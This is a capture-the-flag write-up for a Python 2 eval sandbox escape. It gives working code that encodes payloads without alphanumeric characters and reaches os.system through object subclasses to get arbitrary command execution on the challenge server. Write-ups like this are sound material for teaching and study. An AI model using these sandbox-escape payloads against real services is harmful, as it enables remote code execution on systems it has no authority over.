# Tiebreaker
###### 100 Points


### Problem
The tellers at BigBuckBankingCorp were struggling to properly add up the account balances of their clients, so the (underfunded) IT department built them a central mainframe. (Yes, BigBuckBankingCorp lives in the stone age.)

The mainframe is running on port {{*PORT*}} at {{*IP*}}. In order to be more easily scriptable, it takes stdin, and then it’ll spit out stdout.

Your mission is to compromise the server such that an HTTP request to http://{{*IP*}}:80 returns a valid response that contains your team name, SST CTF. Submitting a flag will trigger a request to the server to detect whether the challenge is solved. Submit anything as the flag, but note that you cannot submit the same text twice. The text submitted as the flag is not important; whether the server responds to an HTTP request with a response containing your team name is the only criteria for a valid solution. Each team has its own server.


### Hint
 - Scores will be determined based on time taken to solve.
 - Try not to break your server, however you may at any point request that it be reset to its original image by emailing contact@pactf.com and being sure to include your team code {{*REDACTED*}} in your email. Such a request will have a time penalty of 12 hours, and we cannot guarantee an immediate response.
 - It is possible to gain root shell access to the server. Your job is to respond to HTTP requests on port 80 with your team name; doing anything beyond this (such as cryptocurrency mining or torrenting, for example) is grounds for disqualification.

### Writeup

##### Part 0: Probing the Server
First things first, we attempt to connect to the port using netcat. 
We are given no prompt. After testing a few inputs, we find '.' nets us an error output.
```
$ nc {{IP}} {{PORT}}
.
I'm HAL. I'm happy to do things for you, as long as you communicate them without any trickery.
What's your query? (Enter 'q' to exit.)
--> Traceback (most recent call last):
  File "server.py", line 16, in <module>
    print('\n' + str(eval(str(eval(query, {'__builtins__': {}})), {'__builtins__': {}})) + '\n')
  File "<string>", line 1
    .
    ^
SyntaxError: unexpected EOF while parsing
```
If we input alphanumeric characters, we get
```
$ nc {{IP}} {{PORT}}
abc123
I'm HAL. I'm happy to do things for you, as long as you communicate them without any trickery.
What's your query? (Enter 'q' to exit.)
--> Numbers and letters can be so mean!
They can hide so many secrets! Stop using them! STOP!
-->
```
Clearly, there is an alphanumeric filter in place. 
```python
BLACKLIST = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
```
We need to exploit `eval()` without using alphanumeric characters--a classic python sandbox challenge.
A closer look at the exploitable statement
```python
eval(str(eval(query, {'__builtins__': {}})), {'__builtins__': {}})
```
shows that it evaluates our input; however, it restricts all Python builtins. Having performed reconnaissance on our target, we can start solving the problem. The solution can be divided into three parts: bypassing the alphanumeric filter, gaining arbitrary command execution, and finally starting an HTTP server.

##### Part 1: Bypassing Alphanumeric Filter
After a little bit of searching, we found an excellent [writeup](http://wapiflapi.github.io/2013/04/22/plaidctf-pyjail-story-of-pythons-escape/) to a similar problem. Turns out that in Python2, `{} = []` evaluates to `False` , and `{} < []` evaluates to `True`. Since booleans are a subclass of integers in Python, `True` and `False` can be casted to `1` and `0` when used in arithmetic. We can use this and a few bitwise operations to create a function that will encode all numbers without blacklisted characters.
```python
def get_num(n):
    if n in [-2, -1, 0, 1]:
        return ["~({}<[])", "~([]<[])",
                 "([]<[])",  "({}<[])"][n+2]
    if n % 2:
        return "~%s" % get_num(~n)
    else:
        return "(%s<<({}<[]))" % get_num(n/2)
```
Next, we need to create a function that will encode letters. We quickly found out that we can easily get letters from `a` to `f` by using `repr()` (note that backticks are an alias for this) on a byte and the slicing it (e.g. `` "`\xbb`"[3]`` for the letter `b`). To extend our charset from [a-f] to all characters, we can use `%c` as a format specifier. If we can encode a statement in the form `` '%c' % n ``, we will be able to send any letter by inserting the appropriate ascii value for `n`. The encoding of `%c` was done using the slice `` `'%\xcc'`[1::3]``, where both number were encoded using `get_num()`. Here is the final letter encoding function:
```python
def get_letter(c):
    percent_c = "`'%\xcc'`" + "[%s::%s]" % (get_num(1), get_num(3))
    return percent_c + '%' + get_num(ord(c))
```
For sake of usability, we can create `get_string()`. Note that if input space was limited, we could encode only blacklisted characters instead of all characters.
```python
def get_string(s):
    return '+'.join([get_letter(c) for c in s])
```
##### Part 2: Arbitrary Command Execution
In order to get arbitrary command execution, we can restore the builtins of the outer `eval()`. Using system defined names and methods, we can gain access to all `<type 'object'>` subclasses.
```python
>>> ().__class__
<type 'tuple'>
>>> ().__class__.__base__
<type 'object'>
>>> ().__class__.__base__.__subclasses__()
[<type 'type'>, <type 'weakref'>, <type 'weakcallableproxy'>, ..., <class 'codecs.IncrementalDecoder'>]
```
Our goal is to get a copy of another module's builtins. For that, we need to find a reference to a module in one of the classes we can access. The instruction `sys.modules[name]` returns the reference of a module given a name. We will search for that instruction.
```python
from re import search

modules = set([c.__module__ for c in ().__class__.__base__.__subclasses__()])
for m in modules:
    try:
        with open('/usr/lib/python2.7/' + m + '.py', 'r') as f:
            for line in f:
                if search('= sys.modules\[.+\]', line):
                    print(m, line)
    except:
        pass
```
```
('warnings', "        self._module = sys.modules['warnings'] if module is None else module\n")
```
Searching `/usr/lib/python2.7/warnings.py` reveals `catch_warnings` to be the class that contains a reference to a module.
```python
for i, c in enumerate(().__class__.__base__.__subclasses__()):
    if c.__name__ == 'catch_warnings':
        print(i, c)
```
```
(59, <class 'warnings.catch_warnings'>)
```
Knowing this, we can finally get another module's builtins.
```
>>> ().__class__.__base__.__subclasses__()[59]()._module.__builtins__
{'bytearray': <type 'bytearray'>, ..., <type 'exceptions.OverflowError'>}
```
And with that, arbitrary command execution is one `import os` away.
```python
def send_cmd(cmd):
    cmd = "().__class__.__base__.__subclasses__()[59]()._module.__builtins__['__import__']('os').system('" + cmd + "')"
    send(get_string(cmd))
```
##### Part 3: Starting the Server
With command execution in hand, starting the HTTP server with an index containing the string 'SST CTF' was two commands away.
```python
send_cmd('echo SST\\ CTF > index.html')
send_cmd('python -m SimpleHTTPServer 80')
```
Submit an arbitrary flag and victory is ours!